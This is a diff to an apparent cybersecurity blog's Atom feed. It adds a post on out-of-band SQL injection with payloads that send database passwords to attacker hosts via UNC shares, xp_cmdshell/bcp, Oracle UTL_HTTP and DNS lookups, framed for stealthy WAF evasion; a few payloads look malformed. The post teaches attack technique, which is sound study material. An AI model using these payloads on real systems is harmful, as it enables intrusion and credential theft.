@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-09T14:27:12-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-09T14:57:28-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
 
@@ -2889,7 +2889,272 @@ SELECT username, password FROM users WHERE username = '1' || 1=1 --';
   </li>
 </ul>
 
-<p>It’s a chess match, not a sprint. <strong>WAFs can be defeated but only if you stay unpredictable.</strong></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<p>It’s a chess match, not a sprint. <strong>WAFs can be defeated but only if you stay unpredictable.</strong></p>
+
+<h1 id="out-of-band-sql-injection-oob-sqli">Out-of-Band SQL Injection (OOB SQLi)</h1>
+
+<hr />
+
+<p><strong>What is Out-of-Band SQL Injection?</strong></p>
+
+<p>Out-of-Band SQL Injection (OOB SQLi) is a next-level attack vector used when traditional SQL injection methods (like error-based or boolean-based) are blocked, sanitized, or heavily monitored. Instead of relying on the same channel for both the attack and the response, OOB SQLi splits the communication: you inject through one path, and extract data via another.</p>
+
+<blockquote>
+  <p>Think: “I leave a hidden note in your house, but I read your reply off a billboard across town.”</p>
+</blockquote>
+
+<p>OOB SQLi turns external communication channels like DNS, HTTP, or SMB into covert exfiltration tunnels, letting attackers bypass firewalls, WAFs, and detection systems with surgical precision.</p>
+
+<hr />
+
+<p><strong>Attack Flow: How OOB SQLi Operates</strong></p>
+
+<ol>
+  <li>
+    <p><strong>Injection Point Identified:</strong> Attacker finds a vulnerable SQL input.</p>
+  </li>
+  <li>
+    <p><strong>Payload Delivered:</strong> Payload is crafted to force the database to perform an outbound action.</p>
+  </li>
+  <li>
+    <p><strong>External Callback:</strong> Database calls an external system (DNS, HTTP, SMB) controlled by the attacker.</p>
+  </li>
+  <li>
+    <p><strong>Exfiltration Complete:</strong> The attacker sniffs the outbound request and extracts the data completely out-of-band.</p>
+  </li>
+</ol>
+
+<p>This makes OOB SQLi perfect for stealthy ops in locked-down, segmented, or firewalled environments.</p>
+
+<hr />
+
+<p><strong>Why Use OOB SQL Injection?</strong></p>
+
+<p>Sometimes, you’re up against:</p>
+
+<ul>
+  <li>
+    <p><strong>Read-only or sanitized output</strong> (no direct response to your injection).</p>
+  </li>
+  <li>
+    <p><strong>Tight WAF/IDS filtering</strong>, blocking classic error or time-based SQLi.</p>
+  </li>
+  <li>
+    <p><strong>Air-gapped</strong> or segmented networks that block outbound HTTP but allow DNS or SMB.</p>
+  </li>
+  <li>
+    <p><strong>Stored procedures or encoding</strong> that neuter direct payload feedback.</p>
+  </li>
+</ul>
+
+<p>OOB is the ghost-in-the-wires solution it exploits internal-to-external communication channels, many of which are overlooked by defenders.</p>
+
+<hr />
+
+<p><strong>Techniques by DBMS</strong></p>
+
+<p>Let’s break it down by database engine each one has its own quirks and weaponizable features.</p>
+
+<hr />
+
+<h3 id="mysql--mariadb">MySQL / MariaDB</h3>
+
+<ul>
+  <li><strong>Technique:</strong> <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html"><code class="language-plaintext highlighter-rouge">SELECT</code></a>, <a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file"><code class="language-plaintext highlighter-rouge">load_file</code></a></li>
+  <li><strong>Purpose:</strong> Write query results to a local file on the server, which can then be accessed over SMB/HTTP.</li>
+</ul>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+SELECT password FROM users INTO OUTFILE '\\\\attacker.com\\share\\creds.txt';
+</code></pre>
+</div>
+
+<ul>
+  <li><strong>Fallback:</strong> If HTTP or DNS isn’t natively supported, use UDFs or external scripting to pivot.</li>
+</ul>
+
+<hr />
+
+<h3 id="microsoft-sql-server-mssql">Microsoft SQL Server (MSSQL)</h3>
+
+<ul>
+  <li>
+    <p><strong>Technique:</strong> <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16"><code class="language-plaintext highlighter-rouge">xp_cmdshell</code></a> , <code class="language-plaintext highlighter-rouge">OPENROWSET</code>, <code class="language-plaintext highlighter-rouge">BULK INSERT</code></p>
+  </li>
+  <li>
+    <p><strong>Purpose:</strong> Execute OS-level commands or import/export files via SMB or HTTP.</p>
+  </li>
+</ul>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+EXEC xp_cmdshell 'bcp "SELECT password FROM users" queryout "\\\\10.10.58.187\\logs\\creds.txt" -c -T';
+</code></pre>
+</div>
+
+<p>This leverages the built-in command execution features of MSSQL—pure gold for red teamers.</p>
+
+<hr />
+
+<h3 id="oracle">Oracle</h3>
+
+<ul>
+  <li>
+    <p><strong>Technique:</strong> <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html"><code class="language-plaintext highlighter-rouge">UTL_HTTP</code></a>, <code class="language-plaintext highlighter-rouge">UTL_INADDR</code>, <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html"><code class="language-plaintext highlighter-rouge">UTL_FILE</code></a></p>
+  </li>
+  <li>
+    <p><strong>Purpose:</strong> Make HTTP or DNS calls directly from within PL/SQL blocks.</p>
+  </li>
+</ul>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+DECLARE
+  req UTL_HTTP.REQ;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=' || (SELECT password FROM users WHERE username='admin'));
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+</code></pre>
+</div>
+
+<p>Oracle’s support for outbound HTTP is a red carpet for stealthy exfil.</p>
+
+<hr />
+
+<p><strong>Real-World OOB Channels</strong></p>
+
+<p>OOB isn’t just a concept it lives in real, usable protocols. Here’s how attackers build tunnels out of a target:</p>
+
+<hr />
+
+<h3 id="http-based-exfiltration">HTTP-Based Exfiltration</h3>
+
+<p><strong>Mechanism:</strong> Database calls an external server via HTTP GET/POST request.</p>
+
+<p><strong>Example:</strong>
+A MySQL server with UDF support or a MSSQL server with HTTP client capability sends:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+GET http://evil-server.com/data?exfil=admin123
+</code></pre>
+</div>
+
+<p><strong>Advantage:</strong> Can ride through most outbound firewalls HTTP is almost always allowed.</p>
+
+<hr />
+
+<h3 id="dns-exfiltration">DNS Exfiltration</h3>
+
+<p><strong>Mechanism:</strong> Encodes data inside DNS queries.</p>
+
+<p><strong>Example:</strong><br />
+An attacker sets up a DNS server and injects a payload that forces a DNS lookup:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+SELECT load_file(concat('\\\\',(SELECT password FROM users),'..attacker.com\\dummy'));
+</code></pre>
+</div>
+
+<p><strong>Result:</strong> The server tries to resolve <code class="language-plaintext highlighter-rouge">adminpass.attacker.com</code> and the attacker logs that lookup.</p>
+
+<p><strong>Advantage:</strong> Firewalls rarely block DNS; it’s a goldmine for covert exfiltration.</p>
+
+<hr />
+
+<h3 id="smb-based-exfiltration">SMB-Based Exfiltration</h3>
+
+<p><strong>Mechanism:</strong> The DB writes to an SMB/UNC path pointing to an attacker’s share.</p>
+
+<p><strong>Example (MySQL/MSSQL):</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+SELECT password INTO OUTFILE '\\\\10.10.162.175\\logs\\creds.txt';
+</code></pre>
+</div>
+
+<p><strong>Advantage:</strong> Particularly effective in Windows domains where SMB traffic is trusted internally.</p>
+
+<hr />
+
+<p><strong>Summary: Why OOB SQLi Is a God-Tier Technique</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Feature</th>
+      <th>Benefit</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Bypasses Output Filters</strong></td>
+      <td>No need for verbose DB errors or direct output</td>
+    </tr>
+    <tr>
+      <td><strong>Evasion of WAF/IDS</strong></td>
+      <td>Uses less-monitored protocols like DNS and SMB</td>
+    </tr>
+    <tr>
+      <td><strong>Works in Segmented Networks</strong></td>
+      <td>Exploits internal servers with outbound access</td>
+    </tr>
+    <tr>
+      <td><strong>Highly Stealthy</strong></td>
+      <td>Harder to detect; logs don’t show typical SQLi patterns</td>
+    </tr>
+    <tr>
+      <td><strong>Persistence Ready</strong></td>
+      <td>Can be combined with stored injections for long-term access</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
